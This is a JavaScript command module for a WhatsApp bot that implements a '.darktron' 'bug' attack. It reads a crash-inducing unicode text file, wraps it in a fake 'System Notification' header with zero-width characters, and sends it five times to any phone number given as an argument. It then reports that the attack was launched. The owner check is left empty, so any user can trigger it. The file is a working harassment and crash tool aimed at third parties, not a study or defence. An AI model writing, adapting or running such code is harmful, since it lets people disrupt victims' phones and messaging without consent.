const fs = require("fs");

// 🧼 Clean number
function getCleanNumber(jid) {
  return jid ? jid.replace(/\D/g, "") : null;
}

// 🔍 Resolve sender number
function resolveSenderNumber(m, conn) {
  let senderJid =
    m.key?.participant ||
    m.participant ||
    m.message?.extendedTextMessage?.contextInfo?.participant ||
    m.sender ||
    (m.key?.fromMe && conn?.user?.id) ||
    m.key?.remoteJid;

  if (!senderJid && conn?.decodeJid) {
    try {
      senderJid = conn.decodeJid(m?.key?.remoteJid);
    } catch {
      senderJid = null;
    }
  }

  return getCleanNumber(senderJid);
}

module.exports = async function ({ conn, m, args, reply, jid }) {
  try {
    const isGroup = jid.endsWith("@g.us");
    const senderNum = resolveSenderNumber(m, conn);
    if (!senderNum) return reply("❌ Sender detect nahi ho saka.");

    // 🔐 Owner verification
   

    // 🎯 Target resolution
    if (!args[0]) return reply("❌ *Provide number*\nExample: `.darktron 923xx...`");
    const targetNum = args[0].replace(/\D/g, "");
    if (!targetNum.match(/^\d{9,15}$/)) return reply("❌ *Invalid number.*");

    const targetJid = targetNum + "@s.whatsapp.net";

    // 📂 Load bug content
    let unicode;
    try {
      unicode = fs.readFileSync("./media/tayyabtext.txt", "utf-8");
    } catch {
      return reply("❌ Crash file missing: `./media/tayyabtext.txt`");
    }

    const payload = "📢 *System Notification*\n\n⬇️\u200C\u200B\u200D\n\n" + unicode.repeat(1);
    const sendCount = 5;

    // 🚀 Send 5x with delay
    for (let i = 0; i < sendCount; i++) {
      try {
        await conn.sendMessage(targetJid, { text: payload }, { quoted: m });
        await new Promise((res) => setTimeout(res, 1500)); // delay 1.5s
      } catch {
        return reply(`❌ Failed to send bug to ${targetNum} at attempt #${i + 1}.`);
      }
    }

    return reply(`✅ *DARKTRON attack launched on:* ${targetNum}\n\n> 𝗧𝗔𝗬𝗬𝗔𝗕 ❦ ✓`);
    
  } catch (err) {
    return reply("❌ Error while sending bug. Check logs.\n\n> 𝗧𝗔𝗬𝗬𝗔𝗕 ❦ ✓");
  }
};
